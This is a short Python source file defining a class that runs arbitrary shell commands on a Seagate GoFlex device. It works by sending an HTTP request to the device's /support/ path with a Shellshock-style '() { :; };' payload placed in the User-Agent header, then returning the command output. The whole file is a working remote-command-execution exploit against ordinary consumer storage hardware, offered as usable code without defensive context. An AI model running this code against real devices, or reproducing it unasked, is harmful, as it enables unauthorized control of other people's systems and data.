import requests


class CommandExecutor:

    @classmethod
    def execute(cls, ip: str, command: str) -> str:
        try:
            return cls._unsafe_execute(ip, command)
        except (requests.RequestException, ConnectionError) as exception:
            raise ConnectionError("Can't connect to the GoFlex. Are you sure you wrote the correct IP address?") \
                from exception

    @staticmethod
    def _unsafe_execute(ip: str, command: str) -> str:
        return requests.get(
            url=f"http://{ip}/support/",
            headers={
                "User-Agent": "() { :; }; " + command
            }
        ).text
